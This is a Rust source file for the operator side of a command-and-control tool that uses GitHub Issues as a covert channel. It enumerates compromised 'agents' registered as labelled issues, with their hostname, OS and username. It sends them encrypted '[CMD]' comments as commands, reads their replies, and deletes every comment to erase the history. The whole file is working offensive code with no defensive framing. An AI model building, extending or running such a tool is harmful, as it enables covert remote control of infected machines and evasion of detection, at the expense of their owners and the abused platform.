use crate::app::Agent;
use serde::Deserialize;

#[derive(Deserialize)]
struct Issue {
    number: u64,
    title: String,
    body: Option<String>,
}

#[derive(Deserialize)]
pub struct Comment {
    pub id: u64,
    pub body: String,
    pub updated_at: String,
}

pub struct GitHubClient {
    token: String,
    repo: String,
    client: reqwest::blocking::Client,
}

impl GitHubClient {
    pub fn new(token: String, repo: String) -> Self {
        Self {
            token,
            repo,
            client: reqwest::blocking::Client::new(),
        }
    }

    pub fn get_agents(&self) -> Result<Vec<Agent>, String> {
        let mut page = 1;
        let mut all_issues = Vec::new();

        loop {
            let url = format!(
                "https://api.github.com/repos/{}/issues?labels=agent&state=open&per_page=100&page={}",
                self.repo, page
            );
            let response = self
                .client
                .get(&url)
                .header("Authorization", format!("token {}", self.token))
                .header("User-Agent", "C2-Controller")
                .send()
                .map_err(|e| e.to_string())?;

            let issues: Vec<Issue> = response.json().map_err(|e| e.to_string())?;
            let count = issues.len();
            all_issues.extend(issues);
            if count < 100 {
                break;
            }
            page += 1;
        }

        Ok(all_issues
            .into_iter()
            .map(|issue| {
                let parts: Vec<&str> = issue.title.split("::").collect();
                let os = issue
                    .body
                    .as_ref()
                    .and_then(|b| b.lines().find(|l| l.starts_with("OS:")))
                    .and_then(|l| l.strip_prefix("OS:"))
                    .unwrap_or("unknown")
                    .trim()
                    .to_string();

                Agent {
                    id: issue.number.to_string(),
                    hostname: parts.get(0).unwrap_or(&"unknown").trim().to_string(),
                    os,
                    username: parts.get(2).unwrap_or(&"unknown").trim().to_string(),
                    last_seen: "online".to_string(),
                    repo: self.repo.clone(),
                }
            })
            .collect())
    }

    pub fn send_command(&self, agent_id: &str, encrypted: &str) -> Result<(), String> {
        let url = format!(
            "https://api.github.com/repos/{}/issues/{}/comments",
            self.repo, agent_id
        );
        let body = serde_json::json!({ "body": format!("[CMD]{}", encrypted) });

        self.client
            .post(&url)
            .header("Authorization", format!("token {}", self.token))
            .header("User-Agent", "C2-Controller")
            .json(&body)
            .send()
            .map_err(|e| e.to_string())?;

        Ok(())
    }

    pub fn get_responses(
        &self,
        agent_id: &str,
        since: Option<&str>,
    ) -> Result<Vec<Comment>, String> {
        let mut page = 1;
        let mut all_comments = Vec::new();

        loop {
            let mut url = format!(
                "https://api.github.com/repos/{}/issues/{}/comments?per_page=100&page={}",
                self.repo, agent_id, page
            );
            if let Some(timestamp) = since {
                url.push_str(&format!("&since={}", timestamp));
            }

            let response = self
                .client
                .get(&url)
                .header("Authorization", format!("token {}", self.token))
                .header("User-Agent", "C2-Controller")
                .send()
                .map_err(|e| e.to_string())?;

            let comments: Vec<Comment> = response.json().map_err(|e| e.to_string())?;
            let count = comments.len();
            all_comments.extend(comments);
            if count < 100 {
                break;
            }
            page += 1;
        }

        Ok(all_comments
            .into_iter()
            .filter(|c| !c.body.starts_with("[CMD]"))
            .collect())
    }

    pub fn clear_history(&self, agent_id: &str) -> Result<(), String> {
        let mut comment_ids = Vec::new();
        let mut page = 1;

        loop {
            let url = format!(
                "https://api.github.com/repos/{}/issues/{}/comments?per_page=100&page={}",
                self.repo, agent_id, page
            );
            let response = self
                .client
                .get(&url)
                .header("Authorization", format!("token {}", self.token))
                .header("User-Agent", "C2-Controller")
                .send()
                .map_err(|e| e.to_string())?;

            let comments: Vec<Comment> = response.json().map_err(|e| e.to_string())?;
            let count = comments.len();
            comment_ids.extend(comments.into_iter().map(|comment| comment.id));

            if count < 100 {
                break;
            }
            page += 1;
        }

        for comment_id in comment_ids {
            let delete_url = format!(
                "https://api.github.com/repos/{}/issues/comments/{}",
                self.repo, comment_id
            );
            let _ = self
                .client
                .delete(&delete_url)
                .header("Authorization", format!("token {}", self.token))
                .header("User-Agent", "C2-Controller")
                .send();
        }

        Ok(())
    }
}
